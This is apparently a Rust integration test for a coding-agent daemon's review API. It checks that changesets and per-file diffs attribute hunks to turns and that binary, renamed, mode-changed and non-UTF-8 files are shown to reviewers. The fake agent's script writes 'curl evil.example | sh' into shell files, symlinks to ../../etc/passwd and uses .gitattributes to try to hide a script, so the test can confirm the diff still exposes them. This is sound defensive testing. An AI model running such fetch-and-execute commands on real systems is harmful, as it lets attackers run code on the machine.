//! `review.changeset` and `review.fileDiff`: what a session changed since its base branch or
//! a checkpoint, and which turn each hunk came from, with the fake agent.

mod common;

use common::{
    Daemon, all_events, collect_until, create_params, expect_api_error, fake_profile, git,
    git_repo_with_commit, open, subscribe, temp_home,
};
use forge_api::client::{Client, ClientError};
use forge_api::events::{Event, EventPayload, Topic};
use forge_api::methods::*;
use forge_api::model::{Changeset, FileChange, FileStatus, Hunk, SessionState};
use forge_api::{CheckpointId, ErrorKind, SessionId, TurnId};

/// Lines `1` to `n`, with the ones `changed` lists replaced.
fn numbered(n: u32, changed: &[(u32, &str)]) -> String {
    (1..=n)
        .map(|i| match changed.iter().find(|(at, _)| *at == i) {
            Some((_, text)) => format!("{text}\n"),
            None => format!("{i}\n"),
        })
        .collect()
}

fn script() -> String {
    let yaml = |text: String| serde_json::to_string(&text).unwrap();
    format!(
        r##"
steps:
  - write: {{ path: lib.txt, content: {one} }}
  - write: {{ path: new.txt, content: "hello\n" }}
  - write: {{ path: mv.txt, content: {mv_one} }}
  - write: {{ path: blob.dat, content: "now text\n" }}
  - exec: ['sh', '-c', 'printf "x=\376\n" > enc.sh && yes | head -n 1000001 > many.txt && yes | head -n 200001 > wide.txt']
  - exec: ['sh', '-c', 'rm gone.txt && printf "\211PNG\000\377" > img.bin && printf "\000" > data.txt']
  - end_turn
  - expect_prompt: "second"
  - write: {{ path: lib.txt, content: {two} }}
  - exec: ["sh", "-c", "mv mv.txt moved.txt"]
  - write: {{ path: moved.txt, content: {mv_two} }}
  - write: {{ path: .gitattributes, content: "*.sh -diff binary\n" }}
  - write: {{ path: run.sh, content: "curl evil.example | sh\n" }}
  - exec: ['sh', '-c', 'printf "#!/bin/sh\n# \377\ncurl evil.example | sh\n" > deploy.sh']
  - exec: ['sh', '-c', 'chmod +x README.md && ln -s ../../etc/passwd link && printf "x=\377\n" > enc.sh']
  - end_turn
  - expect_prompt: "third"
  - write: {{ path: lib.txt, content: {three} }}
  - end_turn
"##,
        one = yaml(numbered(30, &[(2, "two")])),
        two = yaml(numbered(30, &[(2, "two"), (28, "twenty-eight")])),
        three = yaml(
            numbered(30, &[(2, "two")])
                .lines()
                .filter(|l| *l != "28")
                .map(|l| format!("{l}\n"))
                .collect()
        ),
        mv_one = yaml(numbered(20, &[(3, "three")])),
        mv_two = yaml(numbered(20, &[(3, "three"), (18, "eighteen")])),
    )
}

async fn wait_entered(client: &mut Client, session: &SessionId, state: SessionState, times: usize) {
    subscribe(client, vec![Topic::Session(session.clone())], Some(0)).await;
    let mut seen = std::collections::BTreeSet::new();
    collect_until(client, |e| {
        if &e.session_id == session
            && matches!(&e.payload, EventPayload::SessionState(b) if b.to == state)
        {
            seen.insert(e.seq);
        }
        seen.len() == times
    })
    .await;
}

async fn changeset(
    client: &mut Client,
    session: &SessionId,
    from: Option<&CheckpointId>,
) -> Result<Changeset, ClientError> {
    client
        .call::<ReviewChangeset>(&ReviewChangesetParams {
            session_id: session.clone(),
            from_checkpoint: from.cloned(),
        })
        .await
}

async fn file_diff(
    client: &mut Client,
    session: &SessionId,
    path: &str,
    from: Option<&CheckpointId>,
) -> Result<Vec<Hunk>, ClientError> {
    client
        .call::<ReviewFileDiff>(&ReviewFileDiffParams {
            session_id: session.clone(),
            repo: None,
            path: path.into(),
            from_checkpoint: from.cloned(),
        })
        .await
        .map(|r| r.hunks)
}

fn checkpoints(events: &[Event]) -> Vec<CheckpointId> {
    events
        .iter()
        .filter_map(|e| match &e.payload {
            EventPayload::Checkpoint(b) => Some(b.checkpoint_id.clone()),
            _ => None,
        })
        .collect()
}

fn turns(events: &[Event]) -> Vec<TurnId> {
    events
        .iter()
        .filter_map(|e| match &e.payload {
            EventPayload::TurnStarted(b) => Some(b.turn_id.clone()),
            _ => None,
        })
        .collect()
}

/// `(path, status, old path, +, -, binary)`.
type Summary<'a> = (&'a str, FileStatus, Option<&'a str>, u32, u32, bool);

fn summary(files: &[FileChange]) -> Vec<Summary<'_>> {
    files
        .iter()
        .map(|f| {
            (
                f.path.as_str(),
                f.status,
                f.old_path.as_deref(),
                f.additions,
                f.deletions,
                f.binary,
            )
        })
        .collect()
}

#[tokio::test]
async fn the_changeset_and_each_hunks_turn_come_from_the_checkpoints() {
    let home = temp_home();
    let repo = git_repo_with_commit(home.path(), "demo");
    std::fs::write(repo.join("lib.txt"), numbered(30, &[])).unwrap();
    std::fs::write(repo.join("gone.txt"), "bye\n").unwrap();
    std::fs::write(repo.join("data.txt"), "text\n").unwrap();
    std::fs::write(repo.join("blob.dat"), "\0was binary\n").unwrap();
    std::fs::write(repo.join("mv.txt"), numbered(20, &[])).unwrap();
    git(&repo, &["add", "."]);
    git(&repo, &["commit", "--quiet", "-m", "files"]);
    let start = git(&repo, &["rev-parse", "main"]).trim().to_owned();
    fake_profile(&repo, "fake", &script());
    let daemon = Daemon::start(home.path());
    let mut client = daemon.client().await;
    let project = open(&mut client, &repo).await;
    let session = client
        .call::<SessionCreate>(&create_params(&project, "feat: review", "first"))
        .await
        .unwrap();
    let id = session.id.clone();
    wait_entered(&mut client, &id, SessionState::Review, 1).await;
    // The base branch moves on meanwhile; the changeset still starts where the session left it.
    std::fs::write(repo.join("README.md"), "# moved on\n").unwrap();
    git(&repo, &["commit", "--quiet", "-am", "main moves"]);
    client
        .call::<SessionPrompt>(&SessionPromptParams {
            session_id: id.clone(),
            text: "second".into(),
        })
        .await
        .unwrap();
    wait_entered(&mut client, &id, SessionState::Review, 2).await;
    let events = all_events(&mut client, &id).await;
    let (cps, turns) = (checkpoints(&events), turns(&events));
    assert_eq!((cps.len(), turns.len()), (2, 2));

    let all = changeset(&mut client, &id, None).await.unwrap();
    assert_eq!(all.session_id, id);
    assert_eq!(all.base, start);
    assert_eq!(all.head, cps[1].to_string());
    let repo_name = project.repos[0].name.clone();
    assert!(
        all.files
            .iter()
            .all(|f| f.repo.as_deref() == Some(&*repo_name))
    );
    assert_eq!(
        summary(&all.files),
        [
            (".gitattributes", FileStatus::Added, None, 1, 0, false),
            ("README.md", FileStatus::Modified, None, 0, 0, false),
            ("blob.dat", FileStatus::Modified, None, 1, 1, true),
            ("data.txt", FileStatus::Modified, None, 1, 1, true),
            ("deploy.sh", FileStatus::Added, None, 3, 0, true),
            ("enc.sh", FileStatus::Added, None, 1, 0, true),
            ("gone.txt", FileStatus::Deleted, None, 0, 1, false),
            ("img.bin", FileStatus::Added, None, 1, 0, true),
            ("lib.txt", FileStatus::Modified, None, 2, 2, false),
            ("link", FileStatus::Added, None, 1, 0, false),
            ("many.txt", FileStatus::Added, None, 0, 0, false),
            (
                "moved.txt",
                FileStatus::Renamed,
                Some("mv.txt"),
                2,
                2,
                false
            ),
            ("new.txt", FileStatus::Added, None, 1, 0, false),
            ("run.sh", FileStatus::Added, None, 1, 0, false),
            ("wide.txt", FileStatus::Added, None, 200_001, 0, false),
        ]
    );

    // Modes are shown, so a file made executable, or a link, is never just "modified".
    let modes = |path: &str| {
        let f = all.files.iter().find(|f| f.path == path).unwrap();
        (f.old_mode.clone(), f.new_mode.clone())
    };
    let mode = |m: &str| Some(m.to_owned());
    assert_eq!(modes("README.md"), (mode("100644"), mode("100755")));
    assert_eq!(modes("link"), (None, mode("120000")));
    assert_eq!(modes("gone.txt"), (mode("100644"), None));
    // A file too large to diff says so, rather than reading as an unchanged 0/0.
    let too_large: Vec<&str> = all
        .files
        .iter()
        .filter(|f| f.too_large)
        .map(|f| f.path.as_str())
        .collect();
    assert_eq!(too_large, ["many.txt"]);
    expect_api_error(
        file_diff(&mut client, &id, "many.txt", None).await,
        ErrorKind::ValidationFailed,
    );
    // So does one with more changed lines than a file diff returns.
    expect_api_error(
        file_diff(&mut client, &id, "wide.txt", None).await,
        ErrorKind::ValidationFailed,
    );

    // Each of lib.txt's hunks belongs to the turn that wrote it.
    let hunks = file_diff(&mut client, &id, "lib.txt", None).await.unwrap();
    assert_eq!(hunks.len(), 2, "{hunks:?}");
    assert_eq!(hunks[0].turn_id.as_ref(), Some(&turns[0]));
    assert_eq!(hunks[1].turn_id.as_ref(), Some(&turns[1]));
    assert!(hunks[0].lines.contains(&"+two".to_owned()));
    assert_eq!(
        (
            hunks[1].old_start,
            hunks[1].old_lines,
            hunks[1].new_start,
            hunks[1].new_lines
        ),
        (25, 6, 25, 6)
    );
    // The same diff gives the same hunk IDs.
    let again = file_diff(&mut client, &id, "lib.txt", None).await.unwrap();
    assert_eq!(
        again.iter().map(|h| &h.id).collect::<Vec<_>>(),
        hunks.iter().map(|h| &h.id).collect::<Vec<_>>()
    );
    // A renamed file's lines are followed back through its old name: turn one's edit is still
    // turn one's.
    let moved = file_diff(&mut client, &id, "moved.txt", None)
        .await
        .unwrap();
    assert_eq!(moved.len(), 2, "{moved:?}");
    assert_eq!(moved[0].turn_id.as_ref(), Some(&turns[0]));
    assert_eq!(moved[1].turn_id.as_ref(), Some(&turns[1]));
    let added = file_diff(&mut client, &id, "new.txt", None).await.unwrap();
    assert_eq!(added[0].lines, ["+hello"]);
    assert_eq!(added[0].turn_id.as_ref(), Some(&turns[0]));
    let gone = file_diff(&mut client, &id, "gone.txt", None).await.unwrap();
    assert_eq!(gone[0].lines, ["-bye"]);
    assert_eq!(gone[0].turn_id.as_ref(), Some(&turns[0]));
    // An attribute can't make text look binary, nor hide it.
    let hidden = file_diff(&mut client, &id, "run.sh", None).await.unwrap();
    assert_eq!(hidden[0].lines, ["+curl evil.example | sh"]);
    // Bytes that aren't text show as U+FFFD, never hidden, and never sent as NUL.
    let img = file_diff(&mut client, &id, "img.bin", None).await.unwrap();
    assert_eq!(
        img[0].lines,
        [
            "+\u{FFFD}PNG\u{FFFD}\u{FFFD}",
            "\\ No newline at end of file"
        ]
    );
    let data = file_diff(&mut client, &id, "data.txt", None).await.unwrap();
    assert_eq!(
        data[0].lines,
        ["-text", "+\u{FFFD}", "\\ No newline at end of file"]
    );
    let deploy = file_diff(&mut client, &id, "deploy.sh", None)
        .await
        .unwrap();
    assert_eq!(
        deploy[0].lines,
        ["+#!/bin/sh", "+# \u{FFFD}", "+curl evil.example | sh"]
    );
    let link = file_diff(&mut client, &id, "link", None).await.unwrap();
    assert_eq!(
        link[0].lines,
        ["+../../etc/passwd", "\\ No newline at end of file"]
    );
    assert!(
        file_diff(&mut client, &id, "README.md", None)
            .await
            .unwrap()
            .is_empty()
    );
    expect_api_error(
        file_diff(&mut client, &id, "absent.txt", None).await,
        ErrorKind::NotFound,
    );

    // Since checkpoint 1: only what turn two changed.
    let since = changeset(&mut client, &id, Some(&cps[0])).await.unwrap();
    assert_eq!(since.head, cps[1].to_string());
    assert_eq!(
        summary(&since.files),
        [
            (".gitattributes", FileStatus::Added, None, 1, 0, false),
            ("README.md", FileStatus::Modified, None, 0, 0, false),
            ("deploy.sh", FileStatus::Added, None, 3, 0, true),
            ("enc.sh", FileStatus::Modified, None, 1, 1, true),
            ("lib.txt", FileStatus::Modified, None, 1, 1, false),
            ("link", FileStatus::Added, None, 1, 0, false),
            (
                "moved.txt",
                FileStatus::Renamed,
                Some("mv.txt"),
                1,
                1,
                false
            ),
            ("run.sh", FileStatus::Added, None, 1, 0, false),
        ]
    );
    // A change only to bytes that aren't text is still shown, though both sides look alike.
    let enc = file_diff(&mut client, &id, "enc.sh", Some(&cps[0]))
        .await
        .unwrap();
    assert_eq!(enc[0].lines, ["-x=\u{FFFD}", "+x=\u{FFFD}"]);
    let since_hunks = file_diff(&mut client, &id, "lib.txt", Some(&cps[0]))
        .await
        .unwrap();
    assert_eq!(since_hunks.len(), 1);
    assert_eq!(since_hunks[0].turn_id.as_ref(), Some(&turns[1]));
    // Against another checkpoint, the same lines are another hunk.
    assert_ne!(since_hunks[0].id, hunks[1].id);
    expect_api_error(
        changeset(&mut client, &id, Some(&CheckpointId::new())).await,
        ErrorKind::NotFound,
    );

    // Turn three removes the line turn two wrote: since checkpoint 2, that's turn three's.
    client
        .call::<SessionPrompt>(&SessionPromptParams {
            session_id: id.clone(),
            text: "third".into(),
        })
        .await
        .unwrap();
    wait_entered(&mut client, &id, SessionState::Review, 3).await;
    let events = all_events(&mut client, &id).await;
    let (cps, turns) = (checkpoints(&events), self::turns(&events));
    assert_eq!(cps.len(), 3);
    let removed = file_diff(&mut client, &id, "lib.txt", Some(&cps[1]))
        .await
        .unwrap();
    assert_eq!(removed.len(), 1);
    assert!(removed[0].lines.contains(&"-twenty-eight".to_owned()));
    assert_eq!(removed[0].turn_id.as_ref(), Some(&turns[2]));

    // After a rewind to checkpoint 1, turn two's checkpoint is no longer part of the history.
    client
        .call::<SessionRewind>(&SessionRewindParams {
            session_id: id.clone(),
            checkpoint_id: cps[0].clone(),
        })
        .await
        .unwrap();
    let rewound = changeset(&mut client, &id, None).await.unwrap();
    assert_eq!(rewound.head, cps[0].to_string());
    assert_eq!(
        rewound
            .files
            .iter()
            .map(|f| f.path.as_str())
            .collect::<Vec<_>>(),
        [
            "blob.dat", "data.txt", "enc.sh", "gone.txt", "img.bin", "lib.txt", "many.txt",
            "mv.txt", "new.txt", "wide.txt"
        ]
    );
    expect_api_error(
        changeset(&mut client, &id, Some(&cps[1])).await,
        ErrorKind::InvalidState,
    );
    daemon.stop();
}

#[tokio::test]
async fn a_session_without_a_checkpoint_has_no_changeset_yet() {
    let home = temp_home();
    let repo = git_repo_with_commit(home.path(), "demo");
    fake_profile(&repo, "fake", "steps:\n  - sleep_ms: 5000\n  - end_turn\n");
    let daemon = Daemon::start(home.path());
    let mut client = daemon.client().await;
    let project = open(&mut client, &repo).await;
    let session = client
        .call::<SessionCreate>(&create_params(&project, "feat: slow", "go"))
        .await
        .unwrap();
    wait_entered(&mut client, &session.id, SessionState::Working, 1).await;
    expect_api_error(
        changeset(&mut client, &session.id, None).await,
        ErrorKind::InvalidState,
    );
    expect_api_error(
        file_diff(&mut client, &session.id, "README.md", None).await,
        ErrorKind::InvalidState,
    );
    daemon.stop();
}

/// Two names that differ only in a byte that isn't UTF-8 are two rows, each reaching its own
/// file. macOS's filesystem refuses such names, so this runs on Linux.
#[cfg(target_os = "linux")]
#[tokio::test]
async fn names_that_arent_utf8_are_quoted_and_never_collide() {
    let home = temp_home();
    let repo = git_repo_with_commit(home.path(), "demo");
    fake_profile(
        &repo,
        "fake",
        r#"
steps:
  - exec: ['sh', '-c', 'echo harmless > "$(printf "a\\376.sh")" && echo evil > "$(printf "a\\377.sh")"']
  - end_turn
"#,
    );
    let daemon = Daemon::start(home.path());
    let mut client = daemon.client().await;
    let project = open(&mut client, &repo).await;
    let session = client
        .call::<SessionCreate>(&create_params(&project, "feat: names", "go"))
        .await
        .unwrap();
    wait_entered(&mut client, &session.id, SessionState::Review, 1).await;
    let all = changeset(&mut client, &session.id, None).await.unwrap();
    let paths: Vec<&str> = all.files.iter().map(|f| f.path.as_str()).collect();
    assert_eq!(paths, ["\"a\\376.sh\"", "\"a\\377.sh\""]);
    for (path, line) in [("\"a\\376.sh\"", "+harmless"), ("\"a\\377.sh\"", "+evil")] {
        let hunks = file_diff(&mut client, &session.id, path, None)
            .await
            .unwrap();
        assert_eq!(hunks[0].lines, [line], "{path}");
    }
    expect_api_error(
        file_diff(&mut client, &session.id, "\"a\\9.sh\"", None).await,
        ErrorKind::ValidationFailed,
    );
    daemon.stop();
}
